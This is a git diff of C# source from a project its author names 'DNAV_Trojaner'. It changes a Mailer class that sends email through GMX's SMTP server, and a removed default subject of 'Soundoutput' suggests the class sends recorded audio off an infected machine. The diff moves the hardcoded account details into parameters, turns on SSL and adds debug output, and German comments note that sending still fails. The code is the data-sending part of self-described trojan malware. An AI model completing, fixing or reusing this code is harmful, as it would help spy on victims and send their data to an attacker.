@@ -8,17 +8,13 @@ namespace DNAV_Trojaner {
 
     //! Klappt immer noch nicht
     class Mailer {
-        public string toEmail = "temp@mail.de";
-        public string fromEmail = "dnav@gmx.de";
-        public string username = "DNAV@gmx.de";
-        public string pw = "";
-        public int port = 465;
-        public string smtpHost = "mail.gmx.com";
-        public string subject = "Soundoutput";  
+        public string toEmail;
+        public string fromEmail;
+        public string username;
+        public string pw;
+        public int port;
+        public string smtpHost;
       
-        public Mailer(string mtoEmail){
-            toEmail = mtoEmail;
-        }
         public Mailer(string mtoEmail, string mfromEmail, string musername, string mpw, int mport, string msmtpHost)
         {               
             fromEmail = mfromEmail;
@@ -33,7 +29,8 @@ namespace DNAV_Trojaner {
             SmtpClient SmtpServer = new SmtpClient();
             SmtpServer.UseDefaultCredentials = false;
             SmtpServer.Credentials = new System.Net.NetworkCredential(username, pw);
-            SmtpServer.EnableSsl = false;
+            SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
+            SmtpServer.EnableSsl = true;
             mail.To.Add(toEmail);
             mail.From = new MailAddress(fromEmail);          
             mail.Subject = subject;  
@@ -44,8 +41,10 @@ namespace DNAV_Trojaner {
             try {
                 //! FEHLER
                 SmtpServer.Send(mail);
+                Console.WriteLine("gesendet");
             } catch (Exception ex) {
-                //Console.WriteLine(ex);
+                Console.WriteLine("nicht gesendet");
+                Console.WriteLine(ex);
             }
         }
         public void send(string sub, string msg) { //? Nur Betreff&Text
